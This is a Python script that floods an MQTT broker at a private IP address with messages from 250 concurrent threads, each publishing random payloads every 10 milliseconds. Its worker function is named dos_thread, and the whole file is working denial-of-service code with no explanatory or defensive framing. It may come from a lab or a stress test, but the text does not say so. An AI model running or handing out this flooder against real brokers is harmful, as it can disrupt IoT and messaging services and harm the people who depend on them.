import paho.mqtt.client as mqtt
import threading
import time
import random
import signal

broker_address = "172.26.10.16"
broker_port = 1883
topic = "test/topic"

message_count = 0
stop_event = threading.Event()

def on_connect(client, userdata, flags, rc):
    print(f"Connected with result code {rc}")

def on_publish(client, userdata, mid):
    global message_count
    message_count += 1

def dos_thread():
    client = mqtt.Client()
    client.on_connect = on_connect
    client.on_publish = on_publish
    
    try:
        client.connect(broker_address, broker_port, 60)
    except Exception as e:
        print(f"Connection failed: {e}")
        return

    client.loop_start()

    while not stop_event.is_set():
        try:
            payload = str(random.random())
            client.publish(topic, payload, qos=0)
            time.sleep(0.01)
        except Exception as e:
            print(f"Publish failed: {e}")

    client.loop_stop()
    client.disconnect()
    print("Thread stopped")

def signal_handler(signum, frame):
    print("Interrupt received, stopping threads...")
    stop_event.set()

signal.signal(signal.SIGINT, signal_handler)

num_threads = 250

threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=dos_thread)
    thread.start()
    threads.append(thread)

try:
    while not stop_event.is_set():
        time.sleep(1)
        print(f"Total messages published: {message_count}")
except KeyboardInterrupt:
    print("KeyboardInterrupt caught in main thread")
    stop_event.set()

# Wait for all threads to complete
print("Waiting for all threads to stop...")
for thread in threads:
    thread.join()

print("All threads stopped. Script terminated.")
